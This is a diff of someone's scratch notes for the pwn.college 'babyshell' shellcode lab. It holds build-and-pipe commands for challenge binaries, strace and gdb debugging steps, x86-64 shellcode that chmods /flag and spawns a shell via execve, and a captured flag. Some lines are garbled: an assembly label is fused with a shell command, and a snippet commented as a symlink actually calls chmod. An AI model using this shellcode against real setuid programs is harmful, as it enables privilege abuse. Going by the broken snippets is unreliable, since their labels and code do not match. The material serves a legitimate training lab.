@@ -356,9 +356,7 @@ syscall4:
     .byte 0x37
 
 #\0 is null terminating for strings
-flag:
-    .ascii "/flag\0"
-
+flag:cat solve.bin | /challenge/babyshell_level6
 
 gcc -nostdlib -o solve.elf shell5.s
 ./solve.elf
@@ -429,8 +427,71 @@ cat solve.bin | /challenge/babyshell_level6
 
 pwn.college{U9daynYJnepLdAJU-nWLYoGWVgR.QXyIjMscTOxUzW}
 
+# 7
+
+gcc -nostdlib -o solve.elf shell7_2.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level7
 
 # 8
 
 
+
+gcc -nostdlib -o solve.elf shell8_2.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level8
+
 # 13
+mov al, 42
+syscall
+
+
+# Different debugging stuff
+strace ./solve.elf
+gdb ./solve.elf
+    starti
+    info proc map
+    disp/5i $rip
+    si
+
+# see where challenge fails
+cat solve.bin | strace /challenge/babyshell_level6
+
+
+
+
+#chmodding flag
+mov rbx, 0x00000067616c662f  # /flag
+push rbx
+push rsp   # very cool - takes only one byte
+pop rdi
+push 7  #rwx permissions
+pop rsi
+mov al, 90
+syscall
+
+
+# symlink a to flag
+push 0x61  # "a" string
+push rsp   # very cool - takes only one byte!
+pop rdi
+push 7
+pop rsi
+mov al, 90
+syscall
+
+# symlink a to bash
+push 0x61
+push rsp   # very cool - takes only one byte!
+pop rdi  # points towards "a", symlink to "/bin/sh"
+xor rsi, rsi
+
+
+mov al, 59
+cdq  # reset rdx within a single byte!
+
+syscall
